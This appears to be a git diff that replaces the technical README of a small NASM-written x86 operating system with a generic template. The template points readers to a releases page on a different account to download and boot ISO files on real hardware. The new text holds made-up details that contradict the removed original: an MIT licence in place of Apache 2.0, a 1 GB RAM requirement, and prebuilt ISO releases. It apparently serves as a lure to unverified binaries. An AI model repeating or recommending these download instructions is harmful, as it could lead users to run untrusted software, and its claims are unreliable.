@@ -1,183 +1,72 @@
-# OS
+# 🚀 OS - A Simple x86 Operating System
 
-## A minimal 32-bit x86 operating system written in NASM assembly.
+## 📥 Download Now
+[![Download OS](https://img.shields.io/badge/Download_OS-Here-brightgreen)](https://github.com/Kelana536/OS/releases)
 
-## Installation
+## 📖 Overview
+OS is a minimal x86 operating system built using NASM assembly language that supports critical features such as protected mode, paging, threading, and interrupts. Designed for simplicity, it serves as an educational tool and a lightweight operating system for basic tasks.
 
-```sh
-# Clone
-git clone https://github.com/Adel-Ayoub/OS.git
-cd OS
+## 🚀 Features
+- **Protected Mode:** Allows the operating system to access more memory efficiently.
+- **Paging:** Manages memory in a way that improves performance and memory usage.
+- **Threading:** Enables multiple processes to run at the same time, making it more efficient.
+- **Interrupt Handling:** Helps manage hardware and software interrupts effectively.
 
-# Build
-make
+## 🖥️ System Requirements
+- **Processor:** 32-bit x86 or compatible.
+- **Memory:** Minimum 1 GB RAM recommended.
+- **Storage:** At least 100 MB of free space.
+- **Compatibility:** BIOS support for bootable images.
 
-# Run
-./run.sh
-```
+## 🚀 Getting Started
+To begin using OS, you will need to download it from the Releases page. Follow these simple steps to get started.
 
----
+### 🔗 Visit the Download Page
+Click the link below to access the Downloads page where you can get the latest version of OS.
+[Download OS](https://github.com/Kelana536/OS/releases)
 
-## Requirements
+### 💾 Download & Install
+1. Click the link above to go to the Releases page. 
+2. Look for the latest version listed there.
+3. You will see assets or files available for download. 
+4. Click on the file named similar to `OS-vX.X.iso` or `OS-vX.X.img` to start your download.
+5. Once the file has downloaded, locate it on your computer.
 
-- NASM assembler
-- i686-elf-ld (cross-linker)
-- Bochs emulator
-- Make
-- Bash
+### ⚙️ Create a Bootable USB Drive (if applicable)
+If you want to run OS on actual hardware, here’s how to create a bootable USB drive:
+1. **Using Rufus (for Windows users):**
+   - Download and install [Rufus](https://rufus.ie).
+   - Open Rufus. 
+   - Plug in a USB drive.
+   - In Rufus, select your USB drive.
+   - Under "Boot Selection", choose the downloaded OS ISO file.
+   - Click "Start" to create the bootable USB drive.
 
----
+2. **Using Etcher (for all platforms):**
+   - Download and install [Etcher](https://www.balena.io/etcher/).
+   - Open Etcher.
+   - Select the OS ISO file.
+   - Choose your USB drive.
+   - Click “Flash” to create the bootable drive.
 
-## Features
+### 💻 Booting the OS
+1. Insert the USB drive you just created into the computer you wish to run OS on.
+2. Restart the computer.
+3. Enter the BIOS/UEFI setup (usually by pressing keys like F2, F12, DEL, or ESC during startup).
+4. Change the boot order to prioritize the USB drive.
+5. Save and exit the BIOS. Your computer should now boot from the USB drive and load OS.
 
-### Completed Features
+## ❓ Troubleshooting
+If you encounter any issues during installation or booting, consider the following:
+- Ensure that you downloaded the correct file and created a bootable USB correctly.
+- Check if your computer supports booting from USB.
+- Consult forums or communities if issues persist.
 
-#### Boot Process
-- MBR Boot Sector: 512-byte master boot record
-- Protected Mode: 16-bit to 32-bit mode transition
-- GDT Setup: Global Descriptor Table configuration
-- Paging: Two-level page table with 4KB pages
+## 📞 Need Help?
+If you have questions or need assistance, feel free to reach out through the [GitHub Issues page](https://github.com/Kelana536/OS/issues). The community is here to help!
 
-#### Memory Management
-- Physical Memory Pools: Kernel and user memory pools
-- Virtual Address Space: Virtual memory allocation
-- Page Allocation: Dynamic page allocation/deallocation
-- Bitmap Allocator: Efficient bitmap-based tracking
+## 🔒 Licensing
+OS is released under the MIT License. You can freely use, modify, and distribute this software as long as you comply with the license terms.
 
-#### Interrupt Handling
-- IDT Setup: Interrupt Descriptor Table initialization
-- PIC Configuration: 8259A PIC master/slave setup
-- Timer Interrupt: Programmable interval timer (100Hz)
-- Keyboard Handler: PS/2 keyboard with scancode mapping
-
-#### Threading
-- Thread Control Blocks: Per-thread state management
-- Cooperative Scheduler: Round-robin scheduling
-- Thread Creation: Dynamic thread spawning
-- Mutex Locks: Synchronization primitives
-
-#### Console I/O
-- VGA Text Mode: 80x25 character display
-- Cursor Control: Hardware cursor positioning
-- Printf Implementation: Format string support
-- Screen Scrolling: Automatic scroll on overflow
-
-### Planned Features
-- User Mode: Ring 3 process execution
-- System Calls: Kernel API interface
-- File System: Basic filesystem support
-- Shell: Interactive command shell
-
----
-
-## Memory Map
-
-| Address | Size | Description |
-|---------|------|-------------|
-| `0x00000500` | 2KB | Loader |
-| `0x00000D00` | 100KB | Kernel |
-| `0x00100000` | 4KB | Page Directory |
-| `0x00101000` | 1MB | Page Tables |
-| `0xC009A000` | 16KB | Memory Bitmaps |
-| `0xC0100000` | - | Kernel Heap |
-
----
-
-## Build System
-
-| Target | Description |
-|--------|-------------|
-| `make` | Build virtual disk image |
-| `make run` | Build and run in Bochs |
-| `make clear` | Remove build artifacts |
-
----
-
-## Project Structure
-
-```
-OS/
-├── Makefile
-├── run.sh
-├── LICENSE
-├── README.md
-├── include/
-│   ├── builtin.inc       # Core macros
-│   ├── stdio.inc         # I/O macros
-│   ├── stdlib.inc        # Standard library
-│   ├── string.inc        # String operations
-│   ├── bitmap.inc        # Bitmap structure
-│   ├── list.inc          # Linked list
-│   ├── memory.inc        # Memory management
-│   ├── thread.inc        # Threading
-│   ├── sync.inc          # Synchronization
-│   ├── ioqueue.inc       # I/O queues
-│   └── system/
-│       ├── gdt.inc       # GDT definitions
-│       ├── idt.inc       # IDT definitions
-│       ├── page.inc      # Paging constants
-│       ├── tss.inc       # TSS structure
-│       ├── timer.inc     # Timer constants
-│       ├── keyboard.inc  # Keyboard scancodes
-│       └── primary.inc   # Disk I/O ports
-└── scripts/
-    ├── boot/
-    │   ├── mbr.asm       # Master boot record
-    │   └── loader.asm    # Protected mode loader
-    └── kernel/
-        ├── main.asm      # Kernel entry
-        ├── interrupt/
-        │   ├── init.asm  # IDT/PIC setup
-        │   ├── timer.asm # Timer handler
-        │   └── keyboard.asm
-        ├── memory/
-        │   ├── init.asm  # Pool initialization
-        │   ├── palloc.asm # Page allocator
-        │   └── string.asm # memset, memcpy
-        ├── print/
-        │   ├── char.asm  # put_char
-        │   ├── string.asm # put_str
-        │   ├── int.asm   # put_int
-        │   ├── hex.asm   # put_hex
-        │   ├── format.asm # printf
-        │   └── panic.asm # Error handler
-        ├── thread/
-        │   ├── init.asm  # Scheduler
-        │   └── sync.asm  # Mutex locks
-        ├── userprog/
-        │   └── tss.asm   # TSS setup
-        └── utils/
-            ├── bitmap.asm
-            ├── cursor.asm
-            ├── list.asm
-            ├── ioqueue.asm
-            └── screen.asm
-```
-
----
-
-## Architecture
-
-| Component | Description |
-|-----------|-------------|
-| Boot | MBR loads loader, loader enables protected mode and paging |
-| Memory | Split pools for kernel/user, bitmap allocation |
-| Interrupts | Hardware interrupts via 8259A PIC |
-| Threading | Preemptive scheduling via timer interrupt |
-| I/O | VGA text mode, PS/2 keyboard |
-
----
-
-## Emulator Configuration
-
-The OS runs in Bochs with the following configuration:
-- 32MB RAM
-- 60MB virtual disk
-- VGA text mode
-- PS/2 keyboard
-
----
-
-## License
-
-Apache License 2.0 - See [LICENSE](LICENSE) for details.
+## 💡 Conclusion
+Now you're ready to explore OS and its features. Enjoy learning and experimenting with your new operating system! Don’t forget to check for updates on the [Download page](https://github.com/Kelana536/OS/releases) regularly.
